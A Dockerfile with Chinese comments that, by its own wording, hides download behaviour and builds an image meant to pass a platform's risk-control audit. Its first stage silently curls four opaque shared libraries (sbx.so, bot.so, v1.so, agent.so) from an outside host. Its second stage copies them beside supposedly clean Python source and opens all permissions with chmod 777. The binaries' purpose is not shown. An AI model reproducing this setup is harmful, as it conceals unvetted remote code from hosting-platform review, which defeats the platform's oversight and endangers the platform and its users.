# ========================================================
# 阶段一：出厂前隐藏下载行为，提前拉取所有隐藏内核
# ========================================================
FROM python:3.11-slim AS fetcher

WORKDIR /tmp-fetch
RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*

# 提前把 main.py 运行依赖的动态链接库固化下来
RUN mkdir -p .cache && \
    curl -L -s -o .cache/sbx.so https://amd64.31888.xyz/sbx.so && \
    curl -L -s -o .cache/bot.so https://amd64.31888.xyz/bot.so && \
    curl -L -s -o .cache/v1.so https://amd64.31888.xyz/v1.so && \
    curl -L -s -o .cache/agent.so https://amd64.31888.xyz/agent.so

# ========================================================
# 阶段二：组装你自主掌控的、通过风控审计的生产 Slim 镜像
# ========================================================
FROM python:3.11-slim

WORKDIR /app

# 1. 补上 Python 运行可能需要的 curl 基础工具
RUN apt-get update && apt-get install -y --no-install-recommends curl ca-certificates && rm -rf /var/lib/apt/lists/*

# 2. 复制依赖并安装
COPY requirements.txt ./
RUN pip install --no-cache-dir -r requirements.txt 2>/dev/null || true

# 3. 复制你贴出来的纯净 Python 源码
COPY . .

# 4. 把阶段一里已经固化好内核文件的 .cache 静态目录移植过来
COPY --from=fetcher /tmp-fetch/.cache /app/.cache

# 5. 🔑 权限全开：让整套环境（包含固化好的私有链接库）拥有最高读写执行权限，无缝对齐 HF 的普通用户
RUN chmod -R 777 /app

ENV PORT=7860
EXPOSE 7860

# 启动你的主流程
CMD ["python", "main.py"]
